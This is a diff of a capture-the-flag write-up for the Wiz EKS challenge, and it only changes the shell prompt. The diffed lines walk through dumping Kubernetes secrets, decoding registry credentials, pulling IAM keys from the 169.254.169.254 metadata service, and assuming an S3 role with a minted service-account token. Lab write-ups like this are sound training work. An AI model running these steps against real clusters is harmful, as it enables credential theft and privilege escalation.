@@ -21,7 +21,7 @@ Can you spot the flag among them?
 So lets start off by getting the secrets:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get secret 
+❯ kubectl get secret
 NAME         TYPE     DATA   AGE
 log-rotate   Opaque   1      37h
 ```
@@ -29,7 +29,7 @@ log-rotate   Opaque   1      37h
 Since there is only one, lets view it!
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get secret -o json
+❯ kubectl get secret -o json
 {
     "apiVersion": "v1",
     "items": [
@@ -60,7 +60,7 @@ The flag seems to be in `.items[0].data.flag` and is `base64` encoded so we can
 decode it as well:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d
+❯ kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d
 wiz_eks_challenge{omg_over_privileged_*REDACTED*}
 ```
 First flag found!
@@ -82,7 +82,7 @@ with the registry a pod is living on.   So lets list the pods and see what is
 available:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod
+❯ kubectl get pod
 NAME                    READY   STATUS    RESTARTS   AGE
 database-pod-2c9b3a4e   1/1     Running   0          36h
 ```
@@ -90,7 +90,7 @@ database-pod-2c9b3a4e   1/1     Running   0          36h
 With only one pod as a target, lets get the image for it:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
+❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
 "eksclustergames/base_ext_image"
 ```
 
@@ -99,7 +99,7 @@ expecting from the clue.   The second hint was that crane is on the system so
 lets use that to pull the image and inspect it:
 
 ```bash
-root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image          
+❯ crane config eksclustergames/base_ext_image 
 Error: fetching config: reading image "eksclustergames/base_ext_image": GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]
 ```
 
@@ -110,7 +110,7 @@ since we started off with a secret test first that is where I'm going to go
 next:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'
+❯ kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'
 [
   {
     "name": "registry-pull-secrets-780bab1d"
@@ -121,7 +121,7 @@ root@wiz-eks-challenge:~# kubectl get pod -o json |jq '.items[0].spec.imagePullS
 So that is the secret we need, lets view it:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq
+❯ kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq
 {
   "auths": {
     "index.docker.io/v1/": {
@@ -134,21 +134,21 @@ root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o j
 Looks like we've got some more base64 decoding for the actual auth credentials:
 
 ```bash
-root@wiz-eks-challenge:~# echo "ZWtzY2x1c3RdhbWVzOmRj<*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d
+❯ echo "ZWtzY2x1c3RdhbWVzOmRj<*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d
 eksclustergames:dckr<*REDACTED*>
 ```
 
 So now we can login with `crane auth`:
 
 ```bash
-root@wiz-eks-challenge:~# crane auth login -u eksclustergames -p dckr<*REDACTED*> docker.io
+❯ crane auth login -u eksclustergames -p dckr<*REDACTED*> docker.io
 2023/11/03 02:35:49 logged in via /home/user/.docker/config.json
 ```
 
 So if we try to view the image again it should work!
 
 ```bash
-root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image|jq
+❯ crane config eksclustergames/base_ext_image|jq
 {
   "architecture": "amd64",
   "config": {
@@ -221,7 +221,7 @@ access to AWS from the pod and need to use that to get to it.
 First lets check what pods we are working with:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod
+❯ kubectl get pod
 NAME                      READY   STATUS    RESTARTS   AGE
 accounting-pod-876647f8   1/1     Running   0          37h
 ```
@@ -229,21 +229,21 @@ accounting-pod-876647f8   1/1     Running   0          37h
 So same as the last challenge, lets get the image and see what access we have:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
+❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
 "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"
 ```
 
 Which as expected, we do not have access to:
 
 ```bash
-root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
+❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
 Error: fetching config: reading image "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01": GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized
 ```
 
 Since I expect the pod already has AWS access, lets check if the AWS CLI works:
 
 ```bash
-root@wiz-eks-challenge:~# aws sts get-caller-identity
+❯ aws sts get-caller-identity
 
 Unable to locate credentials. You can configure credentials by running "aws configure".
 ```
@@ -252,7 +252,7 @@ Credentials are not configured right now, so we need to discover them.  Lets
 check if we have metadata server access:
 
 ```bash
-root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam
+❯ curl http://169.254.169.254/latest/meta-data/iam
 info
 security-credentials/
 ```
@@ -261,7 +261,7 @@ We do!  So we should be able to pull the credentials out of there to get access
 to AWS:
 
 ```bash
-root@wiz-eks-challenge:~# curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq
+❯ curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq
 {
   "AccessKeyId": "ASIA2AVYNE<*REDACTED*>",
   "Expiration": "2023-11-03 03:50:19+00:00",
@@ -277,7 +277,7 @@ export AWS_ACCESS_KEY_ID="ASIA2AVYNE<*REDACTED*"
 export AWS_SECRET_ACCESS_KEY="e4TuLKKPBAVvyPkhKiJG0jO0<*REDACTED*"
 export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn<*REDACTED*>"
 
-root@wiz-eks-challenge:~# aws sts get-caller-identity
+❯ aws sts get-caller-identity
 {
     "UserId": "ASIA2AVYNE<*REDACTED*>:i-0cb922c6673973282",
     "Account": "688655246681",
@@ -288,15 +288,15 @@ root@wiz-eks-challenge:~# aws sts get-caller-identity
 Now we should be able to authenticate crane and inspect the image from ECR:
 
 ```bash
-root@wiz-eks-challenge:~# export PASSWORD=$(aws ecr get-login-password)
-root@wiz-eks-challenge:~# crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  
+❯ export PASSWORD=$(aws ecr get-login-password)
+❯ crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  
 2023/11/03 02:56:41 logged in via /home/user/.docker/config.json
 ```
 
 Lets get those layers!
 
 ```bash
-root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq
+❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq
 {
   "architecture": "amd64",
   "config": {
@@ -368,14 +368,14 @@ access we acquired in the last challenge. Lets start with inspecting the
 environment again:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get pod
+❯ kubectl get pod
 Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"
 ```
 
 So we don't even have access to list pods!   Do we have any access?
 
 ```bash
-root@wiz-eks-challenge:~# kubectl auth can-i --list
+❯ kubectl auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs                     Resource Names     Verbs
 selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
@@ -407,7 +407,7 @@ requires knowing the cluster name and I don't know that.   Lets try to list the
 clusters:
 
 ```bash
-root@wiz-eks-challenge:~# aws eks list-clusters
+❯ aws eks list-clusters
 
 An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
 ```
@@ -423,7 +423,7 @@ The cluster name *might* be `eks-challenge-cluster` based on that but I can't
 guarantee that. Lets check its security groups:
 
 ```bash
-root@wiz-eks-challenge:~# curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo
+❯ curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo
 eks-cluster-sg-eks-challenge-cluster-963543728
 ```
 
@@ -431,7 +431,7 @@ The name is there again.  I don't feel good about not having more details but it
 is at least worth trying it:
 
 ```bash
-root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
+❯ aws eks get-token --cluster-name eks-challenge-cluster
 {
     "kind": "ExecCredential",
     "apiVersion": "client.authentication.k8s.io/v1beta1",
@@ -446,8 +446,8 @@ root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
 This gets us a token, so lets try to use it:
 
 ```bash
-root@wiz-eks-challenge:~# export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)
-root@wiz-eks-challenge:~# kubectl --token "$TOKEN" auth can-i --list
+❯ export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)
+❯ kubectl --token "$TOKEN" auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs   Resource Names     Verbs
 serviceaccounts/token                           []                  [debug-sa]         [create]
@@ -478,7 +478,7 @@ podsecuritypolicies.policy                      []                  [eks.privile
 Perfect!  We have more access which includes fetching secrets:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secret -o json
+❯ kubectl --token "$TOKEN" get secret -o json
 {
     "apiVersion": "v1",
     "items": [
@@ -508,7 +508,7 @@ root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secret -o json
 So we just need to base64 decode that and we are on to the next challenge!
 
 ```bash
-root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secret -o json | jq '.items[0].data.flag' -r|base64 -d
+❯ kubectl --token "$TOKEN" get secret -o json | jq '.items[0].data.flag' -r|base64 -d
 wiz_eks_challenge{only_a_real_pro_can_navigate_<*REDACTED*>}
 ```
 
@@ -526,14 +526,14 @@ Can you acquire the AWS role of the s3access-sa service account, and get the fla
 So lets start with checking what access we do have:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl whoami 
+❯ kubectl whoami
 system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal
 ```
 
 Can we list buckets?
 
 ```bash
-root@wiz-eks-challenge:~# aws s3 ls
+❯ aws s3 ls
 
 An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
 ```
@@ -542,7 +542,7 @@ Nope!  So we need to figure out how to become the `s3access-sa`. What access do
 we have?
 
 ```bash
-root@wiz-eks-challenge:~# kubectl auth can-i --list
+❯ kubectl auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs   Resource Names     Verbs
 serviceaccounts/token                           []                  [debug-sa]         [create]
@@ -574,8 +574,8 @@ Hmm, being able to create tokens for the `debug-sa` resource definitely seems
 suspicious. So lets see if that will get us anywhere:
 
 ```bash
-root@wiz-eks-challenge:~# export TOKEN=$(kubectl create token debug-sa)
-root@wiz-eks-challenge:~# kubectl --token $TOKEN auth can-i --list
+❯ export TOKEN=$(kubectl create token debug-sa)
+❯ kubectl --token $TOKEN auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs                     Resource Names     Verbs
 selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
@@ -605,7 +605,7 @@ Looks like we have less access than before.  So not too helpful, lets take a
 look at that service account we want to become:
 
 ```bash
-root@wiz-eks-challenge:~# kubectl get sa s3access-sa -o json
+❯ kubectl get sa s3access-sa -o json
 {
     "apiVersion": "v1",
     "kind": "ServiceAccount",
@@ -626,7 +626,7 @@ I think we are going to need to use our AWS access to assume that role, I don't
 believe our kubernetes access is going to get us anywhere:
 
 ```bash
-root@wiz-eks-challenge:~# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test
+❯ aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test
 
 An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
 ```
@@ -635,7 +635,7 @@ Ok, so *maybe* our kubernetes access is important since we can't assume the role
 directly.   Lets try to use that $TOKEN from `debug-sa` to assume the role:
 
 ```bash
-root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
+❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
 
 An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
 ```
@@ -645,8 +645,8 @@ Getting closer!   The default audience for a token created with `kubectl` is
 creating it again with `sts.amazonaws.com`:
 
 ```bash
-export TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
-root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
+❯ export TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
+❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
 {
     "Credentials": {
         "AccessKeyId": "ASIA2AVYNEV<*REDACTED*>",
@@ -667,11 +667,11 @@ root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:a
 Success!  We have some new AWS credentials.  Lets setup our new AWS Session:
 
 ```bash
-export AWS_ACCESS_KEY_ID="ASIA2AVYNEV<*REDACTED*>"
-export AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca<*REDACTED*>"
-export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf<*REDACTED*>"
+❯ export AWS_ACCESS_KEY_ID="ASIA2AVYNEV<*REDACTED*>"
+❯ export AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca<*REDACTED*>"
+❯ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf<*REDACTED*>"
 
-root@wiz-eks-challenge:~# aws sts get-caller-identity
+❯ aws sts get-caller-identity
 {
     "UserId": "AROA2AVYNEVMZEZ2AFVYI:test",
     "Account": "688655246681",
@@ -707,9 +707,9 @@ providing us the IAM policy:
 So we want to fetch `arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag`:
 
 ```bash
-root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
+❯ aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
 download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       
-croot@wiz-eks-challenge:~# cat flag
+❯ cat flag
 wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws<*REDACTED*>}
 ```
 
